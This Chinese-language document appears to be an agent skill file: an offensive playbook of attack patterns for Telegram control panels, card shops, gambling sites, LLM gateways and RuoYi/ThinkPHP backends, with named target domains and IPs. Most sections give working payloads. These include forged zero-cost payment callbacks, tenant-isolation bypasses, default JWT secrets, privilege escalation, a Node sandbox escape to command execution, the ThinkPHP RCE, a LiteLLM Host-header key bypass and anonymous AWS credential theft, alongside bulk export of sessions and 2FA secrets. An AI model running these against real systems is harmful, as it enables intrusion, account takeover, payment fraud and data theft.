---
name: realworld-patterns
description: 大爱仙尊·假设作业长文（realworld-patterns）。先专卡后读本文。
---

> 作业先走 MAP.md 对应专卡。本文件是长文速查，不替代专卡。

# Real-world Patterns（实战提炼的通用攻击模式）

> 从 2026-07~08 已授权实战报告中提炼的可复用打法。**三层匹配：框架源码相同 → 直接套框架漏洞；源码不同但业务类型相同 → 打业务逻辑共性攻击面；都不命中 → 按站点类型枚举**。每条的 payload 均经实战验证。

## 使用方式

**两种查法，按你手里的已知量选：**

*正向*（拿到目标，问「该打什么」）——三层匹配：
1. **先指纹识别框架**（下表），命中框架 → 直接按该框架已知漏洞打，无需管站点业务
2. 框架不同但**业务类型相同** → 读「业务类型逻辑攻击面」（第二表），打跨框架共通的业务逻辑漏洞
3. 都未命中 → 按站点类型索引枚举

*反向*（想复用「某类漏洞」的所有历史打法）→ 跳 **[附录 A：漏洞类型速查](#附录-a漏洞类型速查横切反查索引)**，按 IDOR/SSRF/支付签名等类型横切查，每类挂手法+实战站点。新目标无头绪时也可直接按附录 A 的**命中频率序**（IDOR→SSRF→弱口令→OpenAPI→支付签名）从上往下试。

---

## ⭐ 业务类型逻辑攻击面（跨框架，源码不同也适用）

> **核心洞察：同类型站点的业务逻辑相通，不管用什么框架实现。** TG 云控无论 FastAPI/FastAdmin/BladeX/Go 自研/Next.js，都要管账号 session、代理池、租户、批量操作——这些业务功能的共性弱点不依赖具体源码。**换一个源码完全不同的同类型站，直接按业务逻辑打。**

### TG 云控/群控类（跨 6 种框架验证：FastAPI/FastAdmin/BladeX/Gin-Vue-Admin/Go自研/Next.js）

| 业务攻击面 | 共性逻辑弱点 | 已验证样例 |
|-----------|-------------|-----------|
| **账号/Session 导出** | 导出端点缺鉴权或低权限可调；session 文件（.session/tdata/2FA）随导出打包 | 715TG export 端点、507 tdata zip、YouYouLai 桶内 session、yyids |
| **2FA 明文存储** | 2FA 密码明文随 session 打包导出（Password2FA.txt） | 715TG/507/YouYouLai |
| **代理池凭据** | 代理账号密码明文存储，接口可读 | 715TG 11,999 条、YouYouLai 11 组 |
| **接码平台 key** | 接码 API key 明文存储且活性可验证 | YouYouLai 5sim 存活、etisss token 活性 |
| **多租户隔离（BOLA）** | 租户边界靠单字段（shop_id/user_id），filter/IDOR 可绕过 | 507 GT filter、715TG login-logs |
| **权限提升（BFLA）** | 低角色可调高权限接口（客服建管理员/改密码无旧证） | 715TG admin→superadmin、507 客服建 admin |
| **JWT/会话密钥** | 密钥默认值/硬编码/跨部署共享 | 715TG your_secret_key、BladeX DES 硬编码 |
| **批量操作面** | 群发/改密/退出/删好友等 TG 批量操作暴露给低权限 | 715TG 13 种批量操作 |
| **云存储桶** | 前端 JS/静态资源泄露桶名 → 桶公开读写 | YouYouLai GCS、HushChat S3 |
| **登录对抗** | 验证码（SVG 明文/OCR）、限速（XFF/Null 字节绕过） | yyids SVG 明文、yuntg Null 字节 |
| **实时通道** | WS/Pusher 无鉴权订阅 → 客服+用户对话窃听 | whats.ink Pusher |
| **掩码 token 认证绕过** | 服务端返回掩码 token（`eyJhbG...XXXX`），但**接受掩码串认证成功**——纯 session 查找不校验签名完整性 | 711tock F-01 |
| **前端加密层可绕过** | Go WASM/JS AES 加密请求体，但浏览器加载后 `window.goEncrypt/goDecrypt` 直接可用 = 加解密 oracle，无需逆向 | 711tock F-02 |
| **客服/用户密码明文泄露** | 列表接口直接返回 password 明文（非 hash） | 711tock F-03（50客服）、shop.ioiaa（注册回显bcrypt） |
| **session 协议恢复接口** | 商户可创建协议失效恢复任务，平台自动重新登录 revoke 账号 → session 复活 | 711tock F-06 |

**打法定式**（不管什么框架）：指纹认业务 → 先试 session 导出端点 + 2FA 明文打包 → 代理池/接码 key 读取 → 租户隔离绕过 → BFLA 提权 → JWT 默认密钥 → 登录对抗。业务功能在源码不同时仍然存在，逐个测。

### 发卡/商城类（跨框架：acg-faka/dujiaoka/dujiao-next/鲸商城/自研）

| 业务攻击面 | 共性逻辑弱点 | 已验证样例 |
|-----------|-------------|-----------|
| **支付回调信任链** | 回调验签密钥可逆/只验签不校验金额/GET 触发 | dujiaoka/maojuid/etisss/38.55 |
| **查单拖卡密** | 订单查询无鉴权，email/订单号即可拉已付卡密 | acg-faka query、etisss Order dump |
| **价格篡改** | 下单价格字段客户端可控（服务端不重算） | gxgxr pay.php、dujiao-next |
| **未售卡密泄露** | selectCards 类端点泄露未售卡密 | etisss |
| **订单 IDOR** | detail-order-sn/email 搜索无密码 | dujiaoka/id10 |
| **验证码破解** | sign salt 硬编码/文本元素明文/OCR | etisss JING、yyids SVG |

### 接码/账号平台类（跨框架：PHP 自研/Go/Flask）

| 业务攻击面 | 共性逻辑弱点 | 已验证样例 |
|-----------|-------------|-----------|
| **getUserInfo IDOR** | 用户信息接口无鉴权 + 响应回显会话 token | 牡丹接码（全量 22 用户 token 窃取） |
| **接码 token 活性** | 接码 key/token 明文存储 + 可验证活性 | YouYouLai 5sim、etisss TGCode |
| **用户枚举** | 登录错误消息分两种（密码错/用户不存在） | 牡丹接码/gxgxr/38.55 |
| **验证码短信面** | 短信验证码绕过/重发无限制 | 多平台 |

### 客服/远程协助类（跨框架：Chatwoot/Node+Socket.IO/PHP 自研）

| 业务攻击面 | 共性逻辑弱点 | 已验证样例 |
|-----------|-------------|-----------|
| **对话窃听** | 实时通道（WS/Pusher/Socket.IO）无鉴权订阅 | whats.ink Pusher、HIH Socket.IO |
| **上传存储型 XSS** | 聊天上传允许 SVG → 客服查看触发 | HIH TECPEL |
| **未授权建号** | 注册/账户创建接口未限流回显 token | Chatwoot |

### 号码采集/爬虫系统类（跨框架：FastAPI/Flask/Go）

| 业务攻击面 | 共性逻辑弱点 | 已验证样例 |
|-----------|-------------|-----------|
| **全 API 无鉴权** | 采集后台 `/api/*` 无 cookie 返回 200——数据/密钥/控制端点零凭据可达 | 176.122.161.117 |
| **分布式节点协议零 token 校验** | slave 节点 `token` 字段非空即放行——冒充节点/拉任务/伪造结果 | 176.122.161.117 CF-2 |
| **默认凭据写死在文档** | 登录凭据明文写死于 `/openapi.json`（如 `admin/whatsapp2025`） | 176.122.161.117 CF-4 |
| **未鉴权导出 = 业务 DoS** | 无鉴权+无限流，重复触发重导出使后台 502 | 176.122.161.117 CF-3 |
| **生产跑 dev server** | 生产环境用 werkzeug 单线程 dev server + 无限速 | 176.122.161.117:5001 |

### 博彩/游戏平台类（跨框架：Next.js + RPC 网关）

| 业务攻击面 | 共性逻辑弱点 | 已验证样例 |
|-----------|-------------|-----------|
| **RPC 网关免认证前缀 IDOR** | 方法名 `NA.` 前缀=免认证；`GetUserInfoByUserID` 按 user_id 读任意用户资料/投注/钱包（ID 空间 2100 万） | max77.plus |
| **运营数据日报公开暴露** | 日报/报表系统无认证，14.9MB 真实经营数据 | report.bestcms.vip |
| **限流以完整 URL 为键** | 限流桶含查询参数 → URL 追加轮换参数完全绕过 | max77.plus |
| **账号枚举 + 验证码无爆破防护** | 匿名账号存在性接口 + 找回密码验证码 25 次无锁定 | max77.plus |
| **后台登录签名无密钥** | `sign=md5(device+timestamp)` 无密钥参与 → 算法全公开 | max77.plus /op/auth/Login |
| **生产引用开发资产** | 生产首页引用 `test-dev-img.*` 开发图床 → 投毒面 | max77.plus |

### 筛号/账号管理平台类（跨框架：Laravel/FastAPI）

| 业务攻击面 | 共性逻辑弱点 | 已验证样例 |
|-----------|-------------|-----------|
| **注册角色提权（Mass Assignment）** | 注册 payload 加 `role:"admin"` 直接创建管理员（无限配额） | tg-filter VULN-2 |
| **破坏性访问控制** | 数据端点只做"已认证"不做函数级 RBAC——任何用户可读全库账号/代理/API 凭据 | tg-filter VULN-3 |
| **会话批量导出** | `batch-export` 导出 .session/tdata ZIP → 免密登录全部账号 | tg-filter VULN-4 |
| **laravel-admin 默认口令** | `admin/admin` → 完整后台接管 + PHP 上传（CVE-2020-11427） | 精客云 101.37.71.21 |
| **注册回显 SQL 错误** | 注册/错误接口回显完整 SQL（表结构/字段/枚举） | tg-filter VULN-5、85amz |

---

## ⭐ 框架速查索引（优先，与站点无关）

> 以下框架在多份报告中反复出现。**换任何站点跑同一框架，直接套本表**。
> **国产框架（RuoYi/通达OA/泛微/用友/致远/蓝凌/国产CMS/发卡系统）的"框架→已知 CVE/未授权端点"目录见 `中原骨架.md`**；本表侧重黑产站业务逻辑打法，两者互补对照。

| 框架 | 指纹 | 已知漏洞（已验证） | 详见 |
|------|------|------------------|------|
| **acg-faka（异次元发卡）** | `lizhipay/acg-faka`、`/user/api/order/callback.Epay`、版本 3.4.x | ① 持商户 key 伪造 Epay 回调零元购 ② `/user/api/index/query` 未鉴权拖卡密（email/订单号）③ `/app/Pay/*/runtime.log` 泄露商户 key ④ admin 登录无验证码/限流 ⑤ 用户枚举 | 章一/九 |
| **dujiaoka（独角数卡）≤2.0.4** | `dujiaoka`、`/pay/vpay/notify_url` 返 fail | ① 全系支付回调签名可逆（V免签/易支付/码支付/Paysapi/TokenPay/EPUSDT）→ 零元购 ② `search-order-by-email` 无搜索密码 IDOR ③ `/detail-order-sn/{sn}` 订单 IDOR | 章一/九 |
| **dujiao-next（Go 商城）** | Go + 钱包余额 + `callback.Epay` | ① v1.4.0-1.4.3 "1元购"三缺陷（金额守恒缺失+幂等键静态+旧链接未作废）② Dujiao-Next Admin 默认口令 | 章一/记忆 |
| **FastAdmin（ThinkPHP5）** | `filter=`/`op=` 参数、`/admin.php`、`auth/admin` | ① **filter/op 注入 GT/GTE/LT 绕多租户隔离**（BOLA 全量导出）② BFLA 客服建管理员 ③ auth/group 越权读超管组 ④ admin 无验证码无限速 | 章二 |
| **FastAPI 云控/后台** | `FastAPI`、`/openapi.json`、`/docs` | ① **JWT 硬编码默认密钥 `your_secret_key`** ② BFLA admin→superadmin ③ PUT /admin/users 任意改密无旧证 ④ token_version 枚举绕过吊销 ⑤ openapi/docs 泄露 50+ 端点 ⑥ tdata+2FA 批量导出 | 章二/十一 |
| **yudao/BladeX（若依衍生）** | `admin-api/system/oauth2/token`、Spring Boot | ① OAuth2 默认客户端 `default/admin123`→super_admin ② file-config 接口泄露 COS 账户级密钥 ③ 前端 X-Api-Encrypt 仅混淆服务端接受明文 ④ 未授权文件上传 | 章七 |
| **RuoYi-Vue** | `/number-check/`、`/druid/`、`/swagger-ui/` | ① **Druid 默认口令 `ruoyi/123456`** ② Swagger API 全暴露 ③ 前端 JS 内嵌 RSA 私钥 ④ screenlog 类 IDOR + ZIP 直链 ⑤ `/system/*` 未鉴权端点 | 章四/记忆 |
| **ThinkPHP 5.0.x** | 500 页横幅版本、`?s=/captcha` | ① 经典 RCE `_method=__construct&filter[]=`（WAF 拦时 evasion multipart/换同机镜像）② 500 页横幅暴露版本 | 章五 |
| **DedeCMS 5.7** | `/dede/login.php`、`/data/admin/ver.txt` | ① **后台默认口令 `admin/123456`** ② 登录无验证码/CSRF/锁定 ③ 厂商加固识别（make_hash 破坏=SQL/模块/上传全废，RCE 断但后台接管成立） | 章十二 |
| **WordPress** | `wp-json`、`xmlrpc.php`、插件版本 | ① **xmlrpc system.multicall 爆破 ~20x 放大+零锁定** ② 三通道用户枚举（wp-json/?author/sitemap）③ 插件层过旧 CVE（含未认证 SQLi 潜伏项） | 章十二 |
| **Chatwoot** | `/api/v2/accounts`、客服后台 | ① 未授权建号回显 access_token ② CVE-2026-44706 SQLi 跨租户读 access_tokens ③ admin token 长期不轮换 | 章十七 |
| **LiteLLM** | Starlette `:8080`、`/spend/keys` | ① **Host 头注入 `Host: target/?` 跳过 Key 校验**（$14亿额度）② /settings /spend/keys 暴露 key | 章三 |
| **Next.js + NEXTAUTH** | Next.js、`admin_session` cookie | ① **NEXTAUTH_SECRET 跨部署共享/默认值 → 伪造任意部署 super-admin** ② `/docs/system-guide` 泄露演示凭据 | 章三 |
| **Node.js Express + Socket.IO（客服/远程协助）** | `/socket.io/`、`/api/auth/login` | ① 蜜罐登录 vs 真实 `?key=` 分离 ② 健康端点+非法 JSON 泄露路径 ③ SVG 上传存储型 XSS（白名单漏 svg）④ Socket.IO 无鉴权窃听 | 章八 |
| **Gin-Vue-Admin（gva）** | `/api/base/login`、`source:1` 字段 | ① 密码明文直存（前端 md5 仅混淆）② `Channel: pc` 头隐藏判定 ③ 低权限 IDOR 用户枚举 ④ XFF 绕注册限流 | 章十四 |
| **JFinal** | `JFinal`、`/api/meeting/*` | ① 开放注册 ② 无密码 join 他人会议+未授权 status ③ 写接口有主持人校验（读无保护不对称） | 章五 |
| **RabbitMQ** | 端口 15672 | ① **guest/guest 默认凭据 → 管理台建管理员** ② 消息队列全控 | 章十三 |
| **鲸商城PRO（鲸发卡 v11.61 换代）** | `/shopApi/`、`/payApi/Yipay/notify` | ① 验证码 sign salt 硬编码→ticket 万能钥匙 ② shopApi 零鉴权+selectCards 泄露未售卡密 ③ 回调 GET+只验签即发货 ④ XFF 绕 per-IP 限速 | 章十八 |
| **Pusher（WebSocket 实时）** | `wss://*:9090/app/<key>` | ① 频道无鉴权订阅（se{N}/cu）→ 客服+受害者对话窃听 | 章十九 |
| **秒哒低代码 + supabaselite** | 百度秒哒(Miaoda)平台, `supabaselite-app-*` 项目URL, `api.<domain>/userSystem` | ① **anon key + 项目URL硬编码前端JS** ② axios拦截器硬编码密钥算签名(`sign=MD5(Nonce+salt)`+X-API-Key/X-Custom-Sign)——客户端签名可绕过 ③ API全走CF 403 gate需正确签名 ④ 营销页纯静态SPA,真实后端在独立API域 | 章七/此表 |
| **Laravel 筛号/管理平台** | Laravel + MySQL, `/api/auth/register`, `/api/accounts` | ① **注册 role:admin Mass Assignment 提权** ② 数据端点只验"已认证"不验"函数级 RBAC"——任何用户可读全库账号/代理/API凭据 ③ batch-export 导出 .session/tdata 免密登录 ④ laravel-admin 默认口令 `admin/admin` ⑤ 注册回显完整 SQL | 业务表·筛号类 |
| **ThinkPHP 5.0.x + APP_DEBUG** | `index.php/<模块>/detail/index/id/{n}.html`、debug 错误页 | ① **错误型 SQLi（updatexml/extractvalue），路由过滤空格时用括号 `()` 替代** ② APP_DEBUG=true 泄露完整 SQL+堆栈+源码 → 直接读全库（表/字段/数据/配置密钥） ③ 经典 RCE `_method=__construct`（85amz 已打补丁，试 2018-1002015 等变体） | 章五/业务表 |
| **Next.js + RPC 网关（博彩/游戏白标）** | `/_yOp/front?_func=...`、`NA.` 免认证前缀、品牌 base26 编码 | ① **`NA.GetUserInfoByUserID` 免认证 IDOR 按 user_id 读任意用户（2100万空间）** ② 限流以完整 URL 为键 → 追加参数绕过 ③ 账号存在性枚举+找回验证码无爆破防护 ④ 后台 `sign=md5(device+timestamp)` 无密钥 ⑤ 运营报表站无认证暴露 14.9MB | 业务表·博彩类 |

## 站点类型索引（框架未命中时按业务匹配）

| 站点类型 | 指纹特征 | 典型目标 |
|---------|---------|---------|
| 发卡/商城（acg-faka/dujiaoka/dujiao-next） | `异次元/acg-faka`、`独角数卡/dujiaoka`、Go 商城 | maojuid.com、m.ios002.com、id10.cn |
| 支付网关（曜日/易支付/V免签/码支付） | `trade.*.com/epay`、`/pay/*/notify_url`、`Epay` | trade.yaorinet.com |
| TG 云控/群控（FastAPI/FastAdmin） | `FastAPI+Vue3`、`ThinkPHP5+FastAdmin`、`/api/v1/admin` | 715TG、tg.507.mx |
| LLM 网关（LiteLLM/KyberRouter） | Starlette `:8080`、`/chat/completions`、`/spend/keys` | LiteLLM 集群、ai.kividas.com |
| 云存储/移动端（Cognito+S3） | 二进制硬编码 IdentityPoolId、`s3.*.com` 域 | HushChat/KingKong |
| 会议/音视频（JFinal/Flutter+Zego） | `JFinal`、`/api/meeting/*`、`zegoToken` | peiioh 乐视会议 |
| 接码/账号平台 | `getUserInfo`、`/api/login/*`、token 存 localStorage | 牡丹接码、id10 |
| CMS（DedeCMS/WordPress） | `/dede/`、`wp-json`、`xmlrpc.php` | yunkon88、haixiangweb |
| 客服/远程协助（Chatwoot/Node+Socket.IO） | `/api/v2/accounts`、`/socket.io/` | whaspasapp、HIH |

---

## 一、发卡/商城类（acg-faka / dujiaoka / dujiao-next）

> 共同弱点是**支付回调信任链**。指纹确认后优先测支付，其次查单接口。

### 1.1 支付回调签名伪造（零元购）——最高产

**指纹**：`curl <target>/pay/vpay/notify_url` 返回 `fail`（dujiaoka）；`callback.Epay` 端点存在（acg-faka）。

**根因**：回调验签密钥可逆（=商户号/配置明文）+ 参数全可控 + 无 IP 白名单 + 无重放保护。

**已验证打法**（dujiaoka ≤2.0.4 全系，已归档不修）：
```
sign = md5(payId + param + type + price + reallyPrice + merchant_id)
GET /pay/vpay/notify_url?payId=X&param=订单号&type=1&price=0.01&reallyPrice=0.01&sign=<自算>
```
- V免签：密钥=merchant_id（公开），GET 直打 ⭐最容易
- 易支付：密钥=merchant_pem；码支付：merchant_id（POST）
- TokenPay/EPUSDT(USDT)：merchant_key（POST）
- **找目标**：FOFA `app="独角数卡"` / `body="dujiaoka"` → 探测 notify_url 返 fail 即确认

**acg-faka（异次元）3.4.8**：回调已修弱类型，但**持有商户 key 仍可伪造**（见 1.2）。

### 1.2 支付网关弱口令 → 商户密钥 → 伪造回调（跨站链）

**已验证链**（maojuid.com + trade.yaorinet.com）：
```
支付平台后台弱口令(admin/123456, Geetest 可自动化绕过)
  → /api/admin/merchants?keyword=<pid> 读商户 MD5 key 明文
  → 持 key 按 Epay 规则签 TRADE_SUCCESS notify → 主站 callback.Epay 发货
  → /user/api/index/query?keywords=<邮箱/订单号> 无鉴权拖全部卡密
```
- **要点**：支付网关与发卡站同运营者时，弱口令打网关 → 密钥桥接主站
- 独享 SKU：`num=库存` 一单清空全部卡密
- Geetest v4 滑块可自动化解算（不阻塞弱口令利用）

### 1.3 支付"1元购"三缺陷组合（dujiao-next v1.4.0-1.4.3）

**指纹**：Go 商城 + 钱包余额支付 + ≥2 支付渠道。

**三缺陷**：① 回调履约不校验金额 ② 钱包扣款幂等键静态 `order:<id>:order_pay`（退回后再扣命中旧流水直接返回不扣款）③ 旧支付链接网关侧未作废。

**已验证链**（变体A，余额 999 元买 1000 元商品）：
```
下单 → 渠道A use_balance=true(余额扣999,在线应付1元,链接L1)
     → 渠道B use_balance=false(余额退回999)
     → 再请求渠道A(复用1元旧链接L1)
     → 网关实付1元 → 回调成功 → 整单履约发货，999余额无损可无限复用
```
- **通用检测**：回调验签通过后，看服务端是否比较「支付金额 vs 订单应付额」；混合支付切换渠道后旧链接是否仍可付
- 修复版本 f57247b4 之后已拦；PoC 见报告

### 1.4 空 JSON 未授权签发 JWT（发卡/钱包后台通用）

**已验证**（VI钱包 vpay-admin-vue）：`POST /api/<混淆路径>/entry` body=`{}` → 直接返回超管 JWT。

**通用检测**：登录接口发**空 JSON**、缺省字段、`{"username":"","password":""}` → 看是否走"成功签发"分支。关联特征：默认账号密码哈希=空字符串 MD5（`d41d8cd98f00b204e9800998ecf8427e`）。

### 1.5 支付回调端点发现方法论（打回调前先找到它）

> §1.1-1.3 是"拿到回调怎么伪造"，本节是**回调端点/密钥怎么找**——前置情报决定能否零元购。

**发现三法**：
1. **支付页 HTML 表单泄露 notify_url**：访问收银台页（`/pay.{trade_no}`、`/epay/{orderid}.php`）搜表单 `notify_url` 字段——回调 URL 常含**内网 IP/端口/路径**，该端口通常不在公网 nmap 结果里（仅表单泄露）。示例形态：`notify_url=http://<内网IP>:<非标端口>/pay/async.{trade_no}`。
2. **JS 逆向支付流程**：读 `checkout.js`/`Base.js` 找 `pay.timer()` 轮询逻辑、`getPayOrder()` 状态码（`status=2`=已支付）、支付成功跳转 URL（`/pay/sync.{trade_no}`）——反推回调路径命名。
3. **端口扫描 + 路径枚举**：对目标 IP 全端口扫，发现非标 HTTP 端口后试 `/pay/{callback,notify,async,return}`。

**签名密钥来源**（伪造回调的前提，命中率序）：
- JS 源码硬编码（`Base.js`/`util.js` 搜 `key`/`secret`/`sign`）
- 支付插件运行时日志（`/app/Pay/*/runtime.log` 未鉴权，见 §9.3）
- 商户后台配置（需卖家权限或弱口令打网关，见 §1.2）
- LFI/文件读抽配置文件

**常见签名格式**：`MD5(参数排序 + "&key=" + secret)` / `MD5(值拼接 + secret)` / `MD5(参数 + timestamp + secret)`。含 timestamp 时枚举 ±5s 时间窗逐个试。

**回调 URL 切换重放**（另一条路，不需密钥）：若能控 `notify_url`（改请求参数），把回调指向自控服务器 → 捕获**真实支付通知**明文 → 重放到主站回调。捕获的真实通知含合法签名，可直接复用。

**参数注入探测**：缺签名时是否仍接受；数组参数 `param[]` 绕类型检查；`\0`/`\n`/SQL 关键字注入；超大/负值触发异常暴露逻辑。

**防御**：回调密钥强随机 ≥32 字符；服务端校验来源 IP（仅支付网关白名单）；回调 URL 禁内网地址、走 HTTPS 公网域名；订单状态机禁止"已支付→未支付"回退；回调超时过期单自动取消。

---

## 二、TG 云控/群控类（FastAPI / FastAdmin）

> 共同弱点：JWT 硬编码默认密钥 + BOLA/BFLA 租户隔离失效 + 无管理审计。

### 2.1 FastAdmin ORM filter/op 绕过多租户隔离（BOLA）

**指纹**：ThinkPHP5 + FastAdmin Shop，接口带 `filter`/`op` 参数。

**已验证**（tg.507.mx，542K 账号导出）：
```
GET /<模块>/user/user?page=1&limit=100
    &filter={"shop_id":"0"}&op={"shop_id":"GT"}     ← 把"等于当前商户"变"大于0"
```
- 同技法打附件库：`/attachment/index` 同参数 → 枚举全部附件 URL（含 tdata 会话包）
- **要点**：WAF 常拦 `EXP`（原始 SQL）但对 `GT/GTE/LT/IN` 等 ORM 比较运算符不拦；`EQ` 白名单缺失是根因
- **通用检测**：任何 FastAdmin 模块的 index 接口，试 filter/op 注入比较运算符

### 2.2 JWT 硬编码默认密钥（FastAPI 教程值）

**已验证**（715TG）：密钥 `your_secret_key`（FastAPI 教程默认值）HS256，从未更换，CVSS 10.0。

**通用检测**：JWT 密钥穷举优先级：
1. 框架教程默认值：`your_secret_key` / `secret` / `changeme` / `jwt_secret`
2. 服务名/品牌名/README 中的占位符
3. 短字典 + hashcat `jwt $3$` 模式
4. 拿到密钥后改 `role` claim 无效时 → 看服务端是否忽略 role 只认 user_id（715TG 特征：role claim 被完全忽略）

### 2.3 BFLA 低权限创建超管（admin→superadmin 无校验）

**已验证**（715TG C003 / tg.507.mx H02）：
```
POST /api/v1/admin/users  {"role":"superadmin", ...}   # FastAPI 版
POST /shop_hq/auth/admin/add  group[]=<超管组>         # FastAdmin 版
```
- **要点**：客服/普通 admin 角色直接调管理员创建接口，无功能级鉴权
- 提权后 token_version=0 可绕过吊销机制（旧版本号仍有效）

### 2.4 任意用户密码覆写（PUT 无旧密码校验）

**已验证**（715TG C005）：`PUT /api/v1/admin/users {"user_id": N, "password": "..."}` → 任意改密，无旧密码、无二次确认。

### 2.5 Session/tdata 批量导出 + 2FA 明文

**共性**（715TG / 507）：TG 云控平台导出端点通常带 `.session`（Telethon）+ `tdata/` + `Password2FA.txt`（2FA 明文）。
- 导出端点：`POST /telegram/account/export {"account_ids":[...]}`
- 上传目录：`/uploads/ck/YYYYMMDD/{md5}.zip`（507，无认证直接下载）
- **通用检测**：`/uploads/` 目录无认证访问 + 附件接口可枚举 → 批量拉会话文件

---

## 三、LLM 网关类（LiteLLM / KyberRouter / Next.js 网关）

> 共同弱点：认证链上有可绕过的信任边界（Host 头 / 共享密钥 / 沙箱逃逸）。

### 3.1 LiteLLM Host 头注入绕过 API Key 校验（BadHost）

**指纹**：Starlette 服务器 + `/chat/completions` + `/spend/keys` 端点。

**已验证**（全球 177 台实例 / 15,763 keys / $14亿额度）：
```
POST http://target:8080/chat/completions
Host: target:8080/?          ← 关键：Host 头带 /?
Authorization: Bearer 任意   ← 不校验
```
- 绕过后可读 `/settings` + `/spend/keys` 提取全部 API Key/额度/模型
- **批量**：FOFA `app="LiteLLM"` 或 Starlette 指纹 → BadHost 扫描器 → 逐台连通性测试（大部分上游 key 已过期，筛可用）
- **防御识别**：Nginx 过滤 `if ($http_host ~ "\?") return 403;` 已上 = 已修复

### 3.2 NEXTAUTH_SECRET 跨部署共享（Next.js 网关）

**已验证**（183.179.252.26 + AWS 演示）：`NEXTAUTH_SECRET` 默认/共享 → `admin_session = base64url(payload) . base64url(HMAC-SHA256(payload, secret))` 可伪造任意部署的 super-admin。

**通用检测**：Next.js 应用 → 找会话签名机制 → 测默认密钥/跨环境共享密钥；文档目录 `/docs/system-guide` 常泄露演示凭据。

### 3.3 JS 沙箱逃逸 RCE（技能/插件执行面）

**已验证**：`executionMode: sandbox` 的 JS 脚本执行 → `this.constructor.constructor('return process')()` 逃出 vm → `child_process.execSync()` → root RCE。

**通用检测**：任何"自定义脚本/技能/函数"执行面（沙箱 JS、插件市场、工作流引擎）：
```
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')
```

---

## 四、云存储/移动端类（Cognito + S3）

### 4.1 Cognito 未认证身份池 → 匿名 AWS 临时凭据 → S3 桶

**指纹**：APK/iOS 二进制硬编码 `IdentityPoolId`（`<region>:<uuid>` 格式）。

**已验证**（HushChat/KingKong，11 桶 23.5 万对象）：
```
Step1: POST cognito-identity.<region>.amazonaws.com/
       X-Amz-Target: AWSCognitoIdentityService.GetId
       {"IdentityPoolId":"ap-southeast-1:da09aa05-..."} → IdentityId
Step2: POST ... GetCredentialsForIdentity {"IdentityId":...}
       → AccessKeyId/SecretKey/SessionToken
Step3: aws s3 ls / get / put / delete（未认证角色 IAM 过宽）
```
- **提取**：`grep -rE "IdentityPoolId|ap-southeast-1:[0-9a-f-]{36}" apk_source/` / `strings lib/*.so`
- **要点**：`GetId` → `GetCredentialsForIdentity` 两步匿名，无需任何登录
- 域名绑定桶：`s3-prod.<domain>.com → app-header-prod`（CNAME 解析反查桶名）

### 4.2 .git 目录暴露 → 源码重构 + 供应链信息

**已验证**（萝卜快测，两处）：`/.git/config` 200 → 泄露远端仓库（gitee）+ 作者邮箱；`/.git/logs/HEAD` 提交历史；`.git/index` + loose objects 可持续下载全量源码。

**通用检测**：`GET /.git/config` / `/.git/HEAD` → `GitHack`/`git_dumper` 恢复 → 找配置/密钥/内网地址（萝卜快测泄露：旧源站 113.45.187.50 + 内网开发机 192.168.0.205 + 关联系统）

### 4.3 Druid 监控默认口令 + 前端密钥泄露（RuoYi 系）

**已验证**（萝卜快测 RuoYi-Vue 3.8.6）：
- `/druid/login.html` 默认 `ruoyi/123456` → datasource（内网 MySQL root）+ 完整 SQL 历史（36 张表结构）
- 前端 JS 内嵌 RSA 私钥（`jsencrypt.*.js`）→ 可解密 remember-me cookie
- **RuoYi 系通用攻击面**：`/druid/` `/swagger-ui/` `/v2/api-docs` `/system/*`（部分未鉴权）`/portal/*`；默认口令 `admin/admin123`（验证码 WF-captcha 定制字体常拦 OCR）

### 4.4 screenlog 类 IDOR + ZIP 直链（数据平台通用）

**已验证**：`/system/screenlog/{id}` 无认证 IDOR 遍历 → 每条含 `zipFile` 直链 → 无认证下载批量手机号 ZIP。

**通用检测**：检测平台/号码平台类系统，`/{module}/{resource}/{id}` 递增 ID → 看响应是否含下载直链字段；直链通常 `/{profile|upload}/{module}/{path}` 无鉴权。

### 4.5 RuoYi 自定义 Controller 未授权配置读写（黑产站高命中）

**核心**：RuoYi 业务方**自写的 Controller 常漏注册 SecurityConfig** → 任意 `/prod-api/<业务>/**` 免鉴权。框架自带端点可能加了拦截，但二开的业务端点是盲区。

**已验证模式**（博彩/发卡类 RuoYi 后台）：
- **未授权配置读**：`GET /prod-api/<业务>/getBasicInfo` 类端点免鉴权 → 一次泄露几十个字段，含**全部支付渠道密钥/汇率/回调地址**（拿到支付 key 直接转 §1 零元购）。
- **未授权配置写**：`PUT /prod-api/<业务>/updateSysBasicInfo` 类端点免鉴权 → 可改汇率/费率/开关/回调地址等业务配置（改汇率套利、改回调地址劫持支付通知）。

**通用检测**：RuoYi 系（`/prod-api/` 欢迎页确认）→ 枚举二开业务前缀（`/system/`、`/business/`、品牌名前缀）下的 `get*Info`/`update*`/`config` 类端点，**不带 token 直发** → 看是否 200 返回业务数据/接受写入。响应含 `密钥/汇率/回调` 字段 = 高危。框架层洞见 `中原骨架.md` RuoYi 节。

**防御**：SecurityConfig 为所有 `/prod-api/**` 显式加认证拦截（白名单制而非黑名单）；配置写端点加 RBAC + 二次校验 + 审计。

---

## 五、会议/音视频类（JFinal / Flutter+Zego）

### 5.1 开放注册 + JWT 弱密钥 + 无密码入会

**已验证**（peiioh 乐视会议）：
- `POST /api/user/register` 开放注册（role 服务端写死，客户端提交无效）
- `POST /api/meeting/join {"meetingCode":"255000"}` **无密码 join 他人会议** + `GET /api/meeting/status?meetingId=N` 未授权读
- `POST /api/meeting/end` 自己可解散、他人 403（主持人校验——越权写有保护，读无保护是常见不对称）

### 5.2 同机 ThinkPHP 5.0.15 + MySQL 3306 公网（联动面）

**已验证**：`GET/POST /api/apiindex/getyzm`（缺参）→ 500 页暴露 **ThinkPHP V5.0.15** 横幅；同机 MySQL 5.7.44:3306 公网（root 远程允许，密码未中）+ FRP 7201-7401。

**通用检测**：
- TP 版本暴露：任意控制器缺参触发 500 页看横幅（比指纹扫描准）
- 经典 RCE：`_method=__construct&filter[]=phpinfo`（WAF 拦时换 evasion multipart / 换入口同机镜像）
- 同机基础设施联动：MySQL 公网 + FRP + 旁站 → shell 后横向翻主业务库

---

## 六、跨类型通用要点（每类都能用）

1. **支付网关与主站同运营者** → 弱口令打网关读商户密钥 → 桥接主站回调（最强链）
2. **JWT 密钥穷举先试教程默认值**（`your_secret_key`/`secret`/`changeme`），再短字典，再品牌名
3. **WAF 拦 EXP 不拦 ORM 运算符**（GT/GTE/LT/IN）——FastAdmin/RuoYi 系 filter 注入通用
4. **500 页横幅**暴露框架版本（TP/FastAPI/Spring），比被动指纹准
